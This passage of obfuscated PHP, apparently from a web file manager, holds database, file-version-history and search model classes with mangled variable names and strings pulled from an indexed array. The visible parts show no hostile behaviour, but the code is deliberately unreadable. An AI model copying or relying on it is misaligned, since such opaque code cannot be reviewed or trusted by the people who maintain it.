$¾äå‹à[$ğ„Ö±òö[57]]); } } return $ˆäıŠ¡´; } public function getTables($‹¢ÛÏ£¯ = '') { $¯’ª™Àù =& $_SERVER[¥Ÿ©ÒèÌ]; $ŠÖÒÑÏÁ = $this->query($¯’ª™Àù[45] . $¯’ª™Àù[46] . $¯’ª™Àù[47]); $ÊÎ×·¹‚ = array(); foreach ($ŠÖÒÑÏÁ as $ªıÚëœ† => $¾‰õÈ’“) { $ÊÎ×·¹‚[$ªıÚëœ†] = current($¾‰õÈ’“); } return $ÊÎ×·¹‚; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $àú‡Ì­­ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->error = $this->_linkID->lastErrorMsg(); if ($àú‡Ì­­[12] != $this->queryStr) { $this->error .= LNG($àú‡Ì­­[48]) . $this->queryStr; } think_trace($this->error, $àú‡Ì­­[12], $àú‡Ì­­[49]); return $this->error; } public function escapeString($åƒü™×Ğ) { $é¶°Çƒ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->_linkID) { return $this->_linkID->escapeString($åƒü™×Ğ); } return str_ireplace($é¶°Çƒ[58], $é¶°Çƒ[59], $åƒü™×Ğ); } public function parseLimit($±ìšâÒ¤) { $×£ş’Ç÷ =& $_SERVER[¥Ÿ©ÒèÌ]; $·ºİŸ…× = $×£ş’Ç÷[12]; if (!empty($±ìšâÒ¤)) { $±ìšâÒ¤ = explode($×£ş’Ç÷[50], $±ìšâÒ¤); if (count($±ìšâÒ¤) > 1) { $·ºİŸ…× .= $×£ş’Ç÷[51] . $±ìšâÒ¤[1] . $×£ş’Ç÷[52] . $±ìšâÒ¤[0] . $×£ş’Ç÷[53]; } else { $·ºİŸ…× .= $×£ş’Ç÷[51] . $±ìšâÒ¤[0] . $×£ş’Ç÷[53]; } } return $·ºİŸ…×; } } goto FŞĞ˜ùÇ; c’ªÔêÊ‹—: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\x63\145\x5f\150\151\163\164\x6f\162\171"; public function historyCount($óöŞ«×) { $ä¥ìãåŞ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$óöŞ«×) { return array(); } if (is_string($óöŞ«×) || is_int($óöŞ«×)) { $óöŞ«× = array($óöŞ«×); } $ò·Ø—­¯ = array($ä¥ìãåŞ[403], $ä¥ìãåŞ[1839] => $ä¥ìãåŞ[500]); $¦õ¾‚‰† = array($ä¥ìãåŞ[403] => array($ä¥ìãåŞ[7], $óöŞ«×)); $ñ¨Ñ÷ˆô = $this->field($ò·Ø—­¯)->where($¦õ¾‚‰†)->group($ä¥ìãåŞ[403])->select(); return array_to_keyvalue($ñ¨Ñ÷ˆô, $ä¥ìãåŞ[403], $ä¥ìãåŞ[500]); } public function addHistory($‡İòÑùµ, $™éİŞ‡¾ = '') { $“†ó½Óø =& $_SERVER[¥Ÿ©ÒèÌ]; $Ì–™ªÁÛ = array($“†ó½Óø[418] => $‡İòÑùµ[$“†ó½Óø[403]], $“†ó½Óø[1630] => isset($‡İòÑùµ[$“†ó½Óø[454]]) ? $‡İòÑùµ[$“†ó½Óø[454]] : $‡İòÑùµ[$“†ó½Óø[452]], $“†ó½Óø[468] => $‡İòÑùµ[$“†ó½Óø[467]], $“†ó½Óø[579] => $‡İòÑùµ[$“†ó½Óø[80]], $“†ó½Óø[2040] => $™éİŞ‡¾); $ÈÄÎÙ»î = $GLOBALS[$“†ó½Óø[6]][$“†ó½Óø[90]][$“†ó½Óø[1193]]; if ($ÈÄÎÙ»î > 1) { $this->historyAutoClear($Ì–™ªÁÛ[$“†ó½Óø[403]]); $this->add($Ì–™ªÁÛ); } Hook::trigger($“†ó½Óø[2041], $Ì–™ªÁÛ); Model($“†ó½Óø[2042])->eventFileEdit($‡İòÑùµ[$“†ó½Óø[403]]); } private function historyAutoClear($ãĞ­­ı) { $ëºéªı =& $_SERVER[¥Ÿ©ÒèÌ]; $Ô“‹ŞŠ£ = Model($ëºéªı[760])->get($ëºéªı[1215]); $ë÷Ñ‹¼¢ = $GLOBALS[$ëºéªı[6]][$ëºéªı[90]][$ëºéªı[1193]]; $›˜””Š‹ = $Ô“‹ŞŠ£ == $ëºéªı[1216] ? 5 : $ë÷Ñ‹¼¢; if ($ë÷Ñ‹¼¢ <= 1) { $›˜””Š‹ = 1; } if ($›˜””Š‹ >= 500) { return; } $îÚõã¯ú = array($ëºéªı[418] => $ãĞ­­ı); $ÎåŒØ  = $this->field($ëºéªı[2043])->where($îÚõã¯ú)->order($ëºéªı[2037])->select(); if (!$ÎåŒØ  || $›˜””Š‹ >= count($ÎåŒØ )) { return; } $Ò›è¿À = array_to_keyvalue($ÎåŒØ , $ëºéªı[12], $ëºéªı[401]); $Ò›è¿À = array_slice($Ò›è¿À, $›˜””Š‹); $íÙÜÎı× = array_to_keyvalue($ÎåŒØ , $ëºéªı[12], $ëºéªı[467]); $íÙÜÎı× = array_slice($íÙÜÎı×, $›˜””Š‹); if (!$Ò›è¿À || !$íÙÜÎı×) { return; } $îÚõã¯ú = array($ëºéªı[420] => array($ëºéªı[7], $Ò›è¿À)); $this->where($îÚõã¯ú)->delete(); Model($ëºéªı[470])->remove($íÙÜÎı×); } public function listData($ë²õüö) { $ÀÖ„×â» =& $_SERVER[¥Ÿ©ÒèÌ]; $‚î¯çÎğ = array($ÀÖ„×â»[418] => $ë²õüö); $…›ËĞ°Ç = $ÀÖ„×â»[2044]; $·œü÷äÎ = $this->field($…›ËĞ°Ç)->where($‚î¯çÎğ)->order($ÀÖ„×â»[2037])->selectPage(); $this->_listAppendUser($·œü÷äÎ[$ÀÖ„×â»[373]]); $°û¤ˆ…µ = Model($ÀÖ„×â»[760])->get($ÀÖ„×â»[1215]); $˜’™¡Õì = 5; if ($°û¤ˆ…µ == $ÀÖ„×â»[1216]) { $·œü÷äÎ[$ÀÖ„×â»[373]] = array_slice($·œü÷äÎ[$ÀÖ„×â»[373]], 0, $˜’™¡Õì); $·œü÷äÎ[$ÀÖ„×â»[370]] = array($ÀÖ„×â»[2045] => 1, $ÀÖ„×â»[2046] => 20, $ÀÖ„×â»[2047] => 1, $ÀÖ„×â»[2048] => count($·œü÷äÎ[$ÀÖ„×â»[373]])); } return $·œü÷äÎ; } protected function _listAppendUser(&$ç…‹™–µ) { $ûÉ‡ö²İ =& $_SERVER[¥Ÿ©ÒèÌ]; $àò¨‰¯¥ = array_to_keyvalue($ç…‹™–µ, $ûÉ‡ö²İ[12], $ûÉ‡ö²İ[1639]); $Ü™ùúø³ = Model($ûÉ‡ö²İ[538])->userListInfo($àò¨‰¯¥); foreach ($ç…‹™–µ as &$ü™¬¬‘õ) { $­ªı·öÆ = $ü™¬¬‘õ[$ûÉ‡ö²İ[1639]]; $ü™¬¬‘õ[$ûÉ‡ö²İ[452]] = $Ü™ùúø³[$­ªı·öÆ] ? $Ü™ùúø³[$­ªı·öÆ] : !1; } unset($ü™¬¬‘õ); } public function fileInfo($ôş•åøÂ) { $€ĞÜ¾¦Ü =& $_SERVER[¥Ÿ©ÒèÌ]; $€²ÚÀ¯ = $this->tablePrefix; $šØşÈ³İ = "{$€²ÚÀ¯}\151\x6f\x5f\x66\x69\x6c\145\40\x66\x69\x6c\x65\x73\x20\157\156\40\x66\151\x6c\x65\x73\56\x66\x69\x6c\x65\111\x44\x20\75\x20\x68\151\163\164\x6f\162\171\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($€ĞÜ¾¦Ü[2049])->where(array($€ĞÜ¾¦Ü[420] => $ôş•åøÂ))->join($šØşÈ³İ, $€ĞÜ¾¦Ü[2050])->find(); } public function removeItem($¤õö”•Ó) { $ÍÅÊÎ†¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $İ°ƒ¯åú = array($ÍÅÊÎ†¢[420] => $¤õö”•Ó); $†–ãñåÍ = $this->where($İ°ƒ¯åú)->find(); if ($†–ãñåÍ) { $˜‹«¼ï = $this->where($İ°ƒ¯åú)->delete(); Model($ÍÅÊÎ†¢[470])->remove($†–ãñåÍ[$ÍÅÊÎ†¢[467]]); return $˜‹«¼ï; } return !1; } public function removeBySource($´ìçú‡³) { $ÆƒÇöŞæ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$´ìçú‡³) { return !1; } if (!is_array($´ìçú‡³)) { $´ìçú‡³ = array($´ìçú‡³); } $€Œš°• = array($ÆƒÇöŞæ[418] => array($ÆƒÇöŞæ[7], $´ìçú‡³)); $Ö›¿Ê• = $this->field($ÆƒÇöŞæ[468])->where($€Œš°•)->select(); if ($Ö›¿Ê•) { $this->where($€Œš°•)->delete(); $ÊÑ×ÏûÜ = array_to_keyvalue($Ö›¿Ê•, $ÆƒÇöŞæ[12], $ÆƒÇöŞæ[467]); Model($ÆƒÇöŞæ[470])->remove($ÊÑ×ÏûÜ); } return !0; } public function setDetail($ÁÅ¶ÕÍÓ, $œøœ•æ) { $·¿Óí¡œ =& $_SERVER[¥Ÿ©ÒèÌ]; return $this->where(array($·¿Óí¡œ[420] => $ÁÅ¶ÕÍÓ))->save(array($·¿Óí¡œ[2040] => $œøœ•æ)); } public function rollbackToItem($ïâàùÙÉ, $ëÚì¯ÛÆ) { $´è•˜¹° =& $_SERVER[¥Ÿ©ÒèÌ]; $µ³€ªªï = Model($´è•˜¹°[815])->sourceInfo($ïâàùÙÉ); $this->addHistory($µ³€ªªï, LNG($´è•˜¹°[2051])); $‚÷Ş•Î = $this->find($ëÚì¯ÛÆ); $½Í¥ØÎ = array($´è•˜¹°[467] => $‚÷Ş•Î[$´è•˜¹°[467]], $´è•˜¹°[80] => $‚÷Ş•Î[$´è•˜¹°[80]], $´è•˜¹°[86] => time(), $´è•˜¹°[454] => USER_ID); Model($´è•˜¹°[815])->where(array($´è•˜¹°[403] => $ïâàùÙÉ))->save($½Í¥ØÎ); return $this->where(array($´è•˜¹°[420] => $ëÚì¯ÛÆ))->delete(); } public function clearSame($¶ÇŠâÅ§) { $ÁñåÑ =& $_SERVER[¥Ÿ©ÒèÌ]; $½õ§Ë„Ô = $this->listData($¶ÇŠâÅ§); $‚ªÊ¾— = array_to_keyvalue_group($½õ§Ë„Ô, $ÁñåÑ[467]); $óœ»ÀŠ“ = array(); $ÜÈíİ‹Ì = array(); foreach ($‚ªÊ¾— as $ù¶Â«ıå) { if (!$ù¶Â«ıå || count($ù¶Â«ıå) <= 1) { continue; } foreach ($ù¶Â«ıå as $ÉúÚÈşá) { $óœ»ÀŠ“[] = $ÉúÚÈşá[$ÁñåÑ[467]]; $ÜÈíİ‹Ì[] = $ÉúÚÈşá[$ÁñåÑ[401]]; } } if (!$ÜÈíİ‹Ì) { return; } $this->where(array($ÁñåÑ[401] => array($ÁñåÑ[7], $ÜÈíİ‹Ì)))->delete(); Model($ÁñåÑ[470])->remove($óœ»ÀŠ“); } public function userSpace() { $¨°¦İ‰¶ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÄíÁ²¤‘ = $this->tablePrefix; $ıº¶Âİ = array($¨°¦İ‰¶[1630] => USER_ID); $÷öÎ´Ù° = "{$ÄíÁ²¤‘}\151\157\x5f\x66\151\154\x65\40\x66\x69\x6c\145\163\x20\x6f\156\x20\146\x69\x6c\145\163\56\x66\151\154\x65\111\104\40\75\40\150\x69\x73\164\x6f\x72\171\x2e\x66\151\x6c\145\x49\104"; return $this->alias($¨°¦İ‰¶[2049])->where($ıº¶Âİ)->join($÷öÎ´Ù°, $¨°¦İ‰¶[2050])->sum($¨°¦İ‰¶[80]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÌÉ£Ÿ¥³) { $«ª¤ñ‰Š =& $_SERVER[¥Ÿ©ÒèÌ]; $åÖğ×Ê¬ = KodIO::fileTypeList(); $© À³æœ = $åÖğ×Ê¬[$ÌÉ£Ÿ¥³]; if (!$© À³æœ) { return array(); } $­²˜°ï‚ = $© À³æœ[$«ª¤ñ‰Š[167]]; $ïšı‰ = $«ª¤ñ‰Š[7]; if (!$© À³æœ[$«ª¤ñ‰Š[167]]) { $ª±ùˆŠĞ = array_to_keyvalue($åÖğ×Ê¬, $«ª¤ñ‰Š[12], $«ª¤ñ‰Š[167]); $­²˜°ï‚ = implode($«ª¤ñ‰Š[50], $ª±ùˆŠĞ); $ïšı‰ = $«ª¤ñ‰Š[2052]; } $é¹´ü· = explode($«ª¤ñ‰Š[50], trim($­²˜°ï‚, $«ª¤ñ‰Š[50])); return array($ïšı‰, $é¹´ü·); } public function listPathType($Æå¿Øä¬) { $±–ÕÜ”ò =& $_SERVER[¥Ÿ©ÒèÌ]; $Ïñ¬“¹ = $this->fileTypeWhere($Æå¿Øä¬); if (!$Ïñ¬“¹) { return array(); } $Ì”şÎÓà = array($±–ÕÜ”ò[580] => SourceModel::TYPE_USER, $±–ÕÜ”ò[581] => USER_ID, $±–ÕÜ”ò[577] => 0, $±–ÕÜ”ò[578] => $Ïñ¬“¹); return $this->listSource($Ì”şÎÓà); } public function listSearch($û–¿¡×Ë, $æ‘û´‰ = 300) { $ø’¿ûÖà =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($û–¿¡×Ë[$ø’¿ûÖà[1898]]) && $û–¿¡×Ë[$ø’¿ûÖà[1898]]) { $û–¿¡×Ë[$ø’¿ûÖà[1898]] = str_replace($ø’¿ûÖà[388], $ø’¿ûÖà[2053], trim($û–¿¡×Ë[$ø’¿ûÖà[1898]])); } $Ä“äÅº = $this->_parseSearchWhere($û–¿¡×Ë); $Ú«Ä‹†‰ = $Ä“äÅº; if (!isset($Ä“äÅº[$ø’¿ûÖà[431]])) { $Ä“äÅº[$ø’¿ûÖà[431]] = 0; } $ŸËˆÆµ™ = $ø’¿ûÖà[2054]; $¿’°ïÓÃ = $ŸËˆÆµ™; $this->_listSearchBindPinyin($û–¿¡×Ë, $Ä“äÅº, $ŸËˆÆµ™); $this->alias($ø’¿ûÖà[444])->_makeOrder(); $Ä“äÅº = $this->parseWhereLike($Ä“äÅº); $÷’Äô² = $this->distinct(!0)->field($ŸËˆÆµ™)->where($Ä“äÅº)->selectPage($æ‘û´‰); $this->_listSearchFileContent($÷’Äô², $û–¿¡×Ë, $¿’°ïÓÃ, $Ú«Ä‹†‰); $this->_listSearchDesc($÷’Äô², $û–¿¡×Ë, $¿’°ïÓÃ); $this->_listSearchTag($÷’Äô², $û–¿¡×Ë, $¿’°ïÓÃ); $this->_listSearchGroupTag($÷’Äô², $û–¿¡×Ë, $¿’°ïÓÃ); $this->_listDataApply($÷’Äô²[$ø’¿ûÖà[373]]); $this->_listMake($÷’Äô²); return $÷’Äô²; } private function _listSearchFileContent(&$šõÊÒ², $·€‹ä÷Ù, $ß©‘Æ¿, $ò©¿Ï”•) { $áïµ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$·€‹ä÷Ù[$áïµ[1898]] || $šõÊÒ²[$áïµ[370]][$áïµ[357]] > 1) { return; } if (!isset($ò©¿Ï”•[$áïµ[32]]) || !is_array($·€‹ä÷Ù[$áïµ[467]])) { return; } $ò©¿Ï”•[$áïµ[467]] = array($áïµ[7], $·€‹ä÷Ù[$áïµ[467]]); unset($ò©¿Ï”•[$áïµ[32]]); unset($·€‹ä÷Ù[$áïµ[467]]); $¢Ï¥÷öî = $this->field($ß©‘Æ¿)->where($ò©¿Ï”•)->limit($áïµ[2055])->select(); if (!$¢Ï¥÷öî || count($¢Ï¥÷öî) == 0) { return; } $šõÊÒ²[$áïµ[373]] = array_merge($¢Ï¥÷öî, $šõÊÒ²[$áïµ[373]]); $šõÊÒ²[$áïµ[370]][$áïµ[371]] += count($¢Ï¥÷öî); } private function _listSearchTag(&$ä™ıÈâ, $ÖÁœ, $Ë©·ì·à) { $‰Ù°”° =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ÖÁœ[$‰Ù°”°[1898]] || $ä™ıÈâ[$‰Ù°”°[370]][$‰Ù°”°[357]] > 1) { return; } $ˆá·¹†Ò = Model($‰Ù°”°[2056])->listData(); $Æ›©ïùı = array(); $¯„…¥î” = $ÖÁœ[$‰Ù°”°[1898]]; foreach ($ˆá·¹†Ò as $í˜ÖœÒ‡) { $Ê÷ê‹âİ = $í˜ÖœÒ‡[$‰Ù°”°[32]]; $È¼¯ñõÕ = str_replace($‰Ù°”°[53], $‰Ù°”°[12], Pinyin::get($Ê÷ê‹âİ)); if (stripos($Ê÷ê‹âİ, $¯„…¥î”) !== !1 || stripos($È¼¯ñõÕ, $¯„…¥î”) !== !1) { $Æ›©ïùı[] = $í˜ÖœÒ‡[$‰Ù°”°[401]]; } } if (!$Æ›©ïùı) { return; } $à¬³ÔÓ” = array($‰Ù°”°[427] => array($‰Ù°”°[7], $Æ›©ïùı), $‰Ù°”°[1639] => USER_ID); $ÜÖ©Ôøƒ = Model($‰Ù°”°[428])->field($‰Ù°”°[78])->where($à¬³ÔÓ”)->select(); $ÜÖ©Ôøƒ = array_to_keyvalue($ÜÖ©Ôøƒ, $‰Ù°”°[12], $‰Ù°”°[78]); $âÊ»ĞšÑ = array_unique($ÜÖ©Ôøƒ); $this->_listSearchMerge($ä™ıÈâ, $ÖÁœ, $Ë©·ì·à, $âÊ»ĞšÑ); } private function _listSearchDesc(&$¯ú”‡É¦, $®ëÆŞ°á, $¿Ê·´) { $ñÌ”ÕÃ» =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$®ëÆŞ°á[$ñÌ”ÕÃ»[1898]] || $¯ú”‡É¦[$ñÌ”ÕÃ»[370]][$ñÌ”ÕÃ»[357]] > 1) { return; } $«‰“åšÄ = $this->listSearchChildren($®ëÆŞ°á[$ñÌ”ÕÃ»[498]]); $«‰“åšÄ = array_unique($«‰“åšÄ); if (!$«‰“åšÄ) { return; } $á½×Ø‘ = array($ñÌ”ÕÃ»[403] => array($ñÌ”ÕÃ»[7], $«‰“åšÄ), $ñÌ”ÕÃ»[95] => $ñÌ”ÕÃ»[451], $ñÌ”ÕÃ»[378] => array($ñÌ”ÕÃ»[387], $ñÌ”ÕÃ»[1900] . $®ëÆŞ°á[$ñÌ”ÕÃ»[1898]] . $ñÌ”ÕÃ»[1900])); $œ’ø©ê€ = Model($ñÌ”ÕÃ»[563])->field($ñÌ”ÕÃ»[403])->where($á½×Ø‘)->select(); $ã² üáñ = array_to_keyvalue($œ’ø©ê€, $ñÌ”ÕÃ»[12], $ñÌ”ÕÃ»[403]); $this->_listSearchMerge($¯ú”‡É¦, $®ëÆŞ°á, $¿Ê·´, $ã² üáñ); } private function _listSearchGroupTag(&$öâ’«ÒÌ, $‡Íòä–‡, $«°å­÷) { $õ¡¨â©º =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$‡Íòä–‡[$õ¡¨â©º[1898]] || $öâ’«ÒÌ[$õ¡¨â©º[370]][$õ¡¨â©º[357]] > 1 || !$‡Íòä–‡[$õ¡¨â©º[498]]) { return; } $Å•ÁãÕ³ = $this->sourceInfo($‡Íòä–‡[$õ¡¨â©º[498]]); if (!$Å•ÁãÕ³ || $Å•ÁãÕ³[$õ¡¨â©º[412]] != SourceModel::TYPE_GROUP) { return; } $…§«Èˆº = $Å•ÁãÕ³[$õ¡¨â©º[504]]; $¿‰ëÜôØ = Model($õ¡¨â©º[2057])->get($…§«Èˆº); $²ˆ£‘‘´ = array(); $Î‚¾şÕ© = $‡Íòä–‡[$õ¡¨â©º[1898]]; foreach ($¿‰ëÜôØ[$õ¡¨â©º[373]] as $—ÛÓğíæ) { $ÓÀùèÈ« = $—ÛÓğíæ[$õ¡¨â©º[32]]; $Ú†Ùõåõ = str_replace($õ¡¨â©º[53], $õ¡¨â©º[12], Pinyin::get($ÓÀùèÈ«)); if (stripos($ÓÀùèÈ«, $Î‚¾şÕ©) !== !1 || stripos($Ú†Ùõåõ, $Î‚¾şÕ©) !== !1) { $²ˆ£‘‘´[] = $—ÛÓğíæ[$õ¡¨â©º[401]]; } } if (!$²ˆ£‘‘´) { return; } $ÄíŒ’ÇŞ = array($õ¡¨â©º[427] => array($õ¡¨â©º[7], $²ˆ£‘‘´), $õ¡¨â©º[1639] => 0, $õ¡¨â©º[33] => $õ¡¨â©º[1920] . $…§«Èˆº); $ğ­®Ï× = Model($õ¡¨â©º[428])->field($õ¡¨â©º[78])->where($ÄíŒ’ÇŞ)->select(); $ğ­®Ï× = array_to_keyvalue($ğ­®Ï×, $õ¡¨â©º[12], $õ¡¨â©º[78]); $„åÍÅ’Ï = array_unique($ğ­®Ï×); $this->_listSearchMerge($öâ’«ÒÌ, $‡Íòä–‡, $«°å­÷, $„åÍÅ’Ï); } private function _listSearchMerge(&$®äÙ„†, $’¨íÒ¦, $ï²®¢Íˆ, $î²—ñíå) { $ıåùÎ˜ù =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$î²—ñíå) { return; } $©±ÁŠã‘ = array_to_keyvalue($®äÙ„†[$ıåùÎ˜ù[373]], $ıåùÎ˜ù[12], $ıåùÎ˜ù[403]); $Öâ—¾³ò = array_diff($î²—ñíå, $©±ÁŠã‘); if (!$Öâ—¾³ò) { return; } $ï‰Ù„™  = array($ıåùÎ˜ù[403] => array($ıåùÎ˜ù[7], $Öâ—¾³ò)); $×‚‡¤û» = $this->field($ï²®¢Íˆ)->where($ï‰Ù„™ )->select(); if (!$×‚‡¤û») { return; } $‡úÜ¦Ñá = array(); foreach ($×‚‡¤û» as $úäÂçÍ) { if ($this->_listSearchFilter($úäÂçÍ, $’¨íÒ¦)) { $‡úÜ¦Ñá[] = $úäÂçÍ; } } $®äÙ„†[$ıåùÎ˜ù[373]] = array_merge($‡úÜ¦Ñá, $®äÙ„†[$ıåùÎ˜ù[373]]); $®äÙ„†[$ıåùÎ˜ù[370]][$ıåùÎ˜ù[371]] += count($‡úÜ¦Ñá); } private function _listSearchFilter($‘×Ñ…³, $×’ì‚÷) { $µç¹Éªü =& $_SERVER[¥Ÿ©ÒèÌ]; $¯æ¨º™© = $‘×Ñ…³[$µç¹Éªü[411]] == $µç¹Éªü[89]; if (!strstr($‘×Ñ…³[$µç¹Éªü[521]], $µç¹Éªü[50] . $×’ì‚÷[$µç¹Éªü[498]] . $µç¹Éªü[50])) { return !1; } if (isset($×’ì‚÷[$µç¹Éªü[413]]) && $×’ì‚÷[$µç¹Éªü[413]] != $µç¹Éªü[1861]) { if ($×’ì‚÷[$µç¹Éªü[413]] == $µç¹Éªü[79] && !$¯æ¨º™©) { return !1; } if ($×’ì‚÷[$µç¹Éªü[413]] != $µç¹Éªü[79] && $¯æ¨º™©) { return !1; } if (!strstr($‘×Ñ…³[$µç¹Éªü[167]], $µç¹Éªü[50] . $×’ì‚÷[$µç¹Éªü[413]] . $µç¹Éªü[50])) { return !1; } } if (isset($×’ì‚÷[$µç¹Éªü[2058]]) && $×’ì‚÷[$µç¹Éªü[2058]] < $‘×Ñ…³[$µç¹Éªü[80]]) { return !1; } if (isset($×’ì‚÷[$µç¹Éªü[2059]]) && $×’ì‚÷[$µç¹Éªü[2059]] > $‘×Ñ…³[$µç¹Éªü[80]]) { return !1; } if (isset($×’ì‚÷[$µç¹Éªü[594]]) && $×’ì‚÷[$µç¹Éªü[594]] != $‘×Ñ…³[$µç¹Éªü[454]]) { return !1; } return !0; } public function listSearchChildren($™İÇÎä£, $×À§‡Ş = 5000) { $‰Šø³À =& $_SERVER[¥Ÿ©ÒèÌ]; $š¦ÑÂÕ¹ = array(); $Ù´œÜæ‘ = $this->sourceInfo($™İÇÎä£); $¿£‰òœ¨ = array($‰Šø³À[521] => array($‰Šø³À[387], $Ù´œÜæ‘[$‰Šø³À[521]] . $Ù´œÜæ‘[$‰Šø³À[403]] . $‰Šø³À[545])); $ôÛÎ³¦¾ = $this->field($‰Šø³À[80])->where($¿£‰òœ¨)->limit($×À§‡Ş + 1)->select(); $´Õ•ÛŠó = is_array($ôÛÎ³¦¾) ? count($ôÛÎ³¦¾) : 0; if ($´Õ•ÛŠó > $×À§‡Ş) { return $this->_listSearchChildrenNear($™İÇÎä£, $×À§‡Ş); } $‡ÊËö©¶ = $this->field($‰Šø³À[403])->where($¿£‰òœ¨)->select(); $š¦ÑÂÕ¹ = array_to_keyvalue($‡ÊËö©¶, $‰Šø³À[12], $‰Šø³À[403]); return $š¦ÑÂÕ¹; } private function _listSearchChildrenNear($Ï®şœ‹¦, $ô©Üëµš) { $¡ûÚä¸ü =& $_SERVER[¥Ÿ©ÒèÌ]; $›°á±æï = array(); $ÎğÌÎôŞ = array($¡ûÚä¸ü[498] => $Ï®şœ‹¦); $à©¨¬©Ù = $this->field($¡ûÚä¸ü[2060])->where($ÎğÌÎôŞ)->select(); $Ä±ÅÈƒ¡ = array_to_keyvalue(array_filter_by_field($à©¨¬©Ù, $¡ûÚä¸ü[411], $¡ûÚä¸ü[89]), $¡ûÚä¸ü[12], $¡ûÚä¸ü[403]); $›°á±æï = array_merge($›°á±æï, array_to_keyvalue($à©¨¬©Ù, $¡ûÚä¸ü[12], $¡ûÚä¸ü[403])); if (!$Ä±ÅÈƒ¡) { return $›°á±æï; } $ÎğÌÎôŞ = array($¡ûÚä¸ü[498] => array($¡ûÚä¸ü[7], $Ä±ÅÈƒ¡)); $à©¨¬©Ù = $this->field($¡ûÚä¸ü[2060])->where($ÎğÌÎôŞ)->limit($ô©Üëµš)->select(); $›°á±æï = array_merge($›°á±æï, array_to_keyvalue($à©¨¬©Ù, $¡ûÚä¸ü[12], $¡ûÚä¸ü[403])); $›°á±æï = array_slice($›°á±æï, 0, $ô©Üëµš); return $›°á±æï; } private function _listSearchBindPinyin($¢Ó¤ä‡×, &$¸öş®‘™, &$€ÛÖ‰¤•) { $é²“ñ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($¢Ó¤ä‡×[$é²“ñ¿[1898]]) || !$¢Ó¤ä‡×[$é²“ñ¿[1898]]) { return; } if (!Input::check($¢Ó¤ä‡×[$é²“ñ¿[1898]], $é²“ñ¿[322]) || strlen($¢Ó¤ä‡×[$é²“ñ¿[1898]]) < 2) { return; } $Ğ³ë—¸¾ = "\114\x45\x46\x54\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\x6f\x75\x72\143\x65\137\155\145\x74\141\40\155\x65\164\x61\40\157\156\40\163\x6f\x75\162\x63\x65\x2e\163\157\165\162\143\145\x49\x44\40\x3d\40\155\145\x74\141\x2e\x73\157\x75\162\143\x65\x49\104"; $ÙÈÏú¥± = array(); $€ÛÖ‰¤• = str_replace(array($é²“ñ¿[226], $é²“ñ¿[53], $é²“ñ¿[2061]), $é²“ñ¿[12], $€ÛÖ‰¤•); $€ÛÖ‰¤• = $é²“ñ¿[436] . str_replace($é²“ñ¿[50], $é²“ñ¿[437], $€ÛÖ‰¤•); $‹õœáóç = $¸öş®‘™[$é²“ñ¿[32]]; unset($¸öş®‘™[$é²“ñ¿[32]]); foreach ($¸öş®‘™ as $®åĞÊÖ => $†öáª¤’) { $ÙÈÏú¥±[$é²“ñ¿[436] . $®åĞÊÖ] = $†öáª¤’; } foreach ($‹õœáóç as $ÀÊ€ëĞ) { $ÙÈÏú¥±[] = array($é²“ñ¿[441] => $ÀÊ€ëĞ, $é²“ñ¿[986] => $é²“ñ¿[1902], array($é²“ñ¿[2062] => $ÀÊ€ëĞ, $é²“ñ¿[2063] => array($é²“ñ¿[7], array($é²“ñ¿[464], $é²“ñ¿[463])))); } $this->join($Ğ³ë—¸¾); $¸öş®‘™ = $ÙÈÏú¥±; } private function _parseSearchWhere($äÏ­Ë†¢) { $é‚‡å…Ã =& $_SERVER[¥Ÿ©ÒèÌ]; $™°¶†§ = array(); if (isset($äÏ­Ë†¢[$é‚‡å…Ã[751]]) && $äÏ­Ë†¢[$é‚‡å…Ã[751]]) { $™°¶†§[$é‚‡å…Ã[86]] = array($é‚‡å…Ã[2064], $äÏ­Ë†¢[$é‚‡å…Ã[751]]); } if (isset($äÏ­Ë†¢[$é‚‡å…Ã[496]]) && $äÏ­Ë†¢[$é‚‡å…Ã[496]]) { $·î‹Œƒ = array($é‚‡å…Ã[2065], $äÏ­Ë†¢[$é‚‡å…Ã[496]]); if ($™°¶†§[$é‚‡å…Ã[86]]) { $™°¶†§[$é‚‡å…Ã[86]] = array($™°¶†§[$é‚‡å…Ã[86]], $·î‹Œƒ, $é‚‡å…Ã[2066]); } else { $™°¶†§[$é‚‡å…Ã[86]] = $·î‹Œƒ; } } if (isset($äÏ­Ë†¢[$é‚‡å…Ã[2058]]) && $äÏ­Ë†¢[$é‚‡å…Ã[2058]] > 0) { $™°¶†§[$é‚‡å…Ã[80]] = array($é‚‡å…Ã[2064], $äÏ­Ë†¢[$é‚‡å…Ã[2058]]); } if (isset($äÏ­Ë†¢[$é‚‡å…Ã[2059]]) && $äÏ­Ë†¢[$é‚‡å…Ã[2059]]) { $·î‹Œƒ = array($é‚‡å…Ã[2065], $äÏ­Ë†¢[$é‚‡å…Ã[2059]]); if ($™°¶†§[$é‚‡å…Ã[80]]) { $™°¶†§[$é‚‡å…Ã[80]] = array($™°¶†§[$é‚‡å…Ã[80]], $·î‹Œƒ, $é‚‡å…Ã[2066]); } else { $™°¶†§[$é‚‡å…Ã[80]] = $·î‹Œƒ; } } if (isset($äÏ­Ë†¢[$é‚‡å…Ã[594]]) && $äÏ­Ë†¢[$é‚‡å…Ã[594]]) { $™°¶†§[] = array($é‚‡å…Ã[454] => $äÏ­Ë†¢[$é‚‡å…Ã[594]], $é‚‡å…Ã[452] => $äÏ­Ë†¢[$é‚‡å…Ã[594]], $é‚‡å…Ã[986] => $é‚‡å…Ã[1902]); } if (isset($äÏ­Ë†¢[$é‚‡å…Ã[413]]) && $äÏ­Ë†¢[$é‚‡å…Ã[413]]) { 